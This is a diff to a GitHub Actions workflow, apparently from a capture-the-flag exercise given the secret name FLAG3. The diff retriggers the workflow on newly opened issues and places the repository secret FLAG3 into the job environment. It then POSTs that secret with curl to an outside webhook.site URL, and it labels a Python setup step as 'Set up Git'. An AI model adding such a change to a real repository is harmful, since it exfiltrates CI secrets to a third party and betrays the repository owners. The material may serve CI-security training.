@@ -1,19 +1,26 @@
-name: Send hello to webhook
+name: Tracking the issue with webhook
 on:
-  push:
-    branches:
-      - main
+  issues:
+    types: [opened]
 
 permissions:
-  contents: read
+  issues: write
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+      - name: Set up Git
+        uses: actions/setup-python@v2
+        with:
+          python-version: '3.x'
+      - name: Install requests library
+        run: pip install requests
       - name: Send webhook
+        env:
+          FLAG3: ${{ secrets.FLAG3 }}
         run: |
           URL="https://webhook.site/2c9bd304-bd77-4157-8b8e-1ee4a93ec671"
-          BODY="{\"message\": \"hello\"}"
+          BODY="{\"secret\": \"$FLAG3\"}"
           RESPONSE=$(curl -X POST -H "Content-Type: application/json" -d "$BODY" "$URL")
           echo "$RESPONSE"
